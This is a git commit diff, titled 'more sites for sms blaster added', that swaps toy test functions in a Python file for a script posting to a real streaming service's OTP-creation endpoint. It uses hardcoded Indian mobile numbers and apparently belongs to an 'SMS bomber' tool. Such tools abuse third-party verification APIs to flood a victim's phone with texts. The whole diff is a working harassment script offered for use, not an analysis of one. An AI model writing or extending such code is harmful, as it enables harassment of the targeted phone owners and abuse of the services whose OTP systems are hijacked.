e8c04997d1f45ba871bd8de25bb293fc0d5febb0
A Ashif <53007623+Ashif4354@users.noreply.github.com>
2023-02-08 22:25:55 +0530

    more sites for sms blaster added

--- testfiles/d.py
+++ testfiles/d.py
@@ -1,14 +1,23 @@
-import random
+import requests
+class A:
+    def hiscor(ph):#1
+        
+        url = 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/TN/CREATEOTP-V2'
+        payload = {
+  'mobileNumber': '8122763755',
+  'channelPartnerID': 'MSMIND',
+  'country': 'IN',
+  'timestamp': '2023-02-08T16:51:58.088Z',
+  'otpSize': '4',
+  'loginType': 'REGISTERORSIGNIN',
+  'isMobileMandatory': 'true'
+}
+        try:
+            p = requests.post(url, data = payload)
+            print(p.status_code)
+        except:            
+            pass
 
-def func_test_1(a):
-    print("This is func_test_1.",a)
+            
 
-def func_test_2(a):
-    print("This is func_test_2.",a)
-
-def func_test_3(a):
-    print("This is func_test_3.",a)
-
-my_list = [func_test_1, func_test_2, func_test_3]
-
-random.choice(my_list)(4)
+A.hiscor('9566782699')
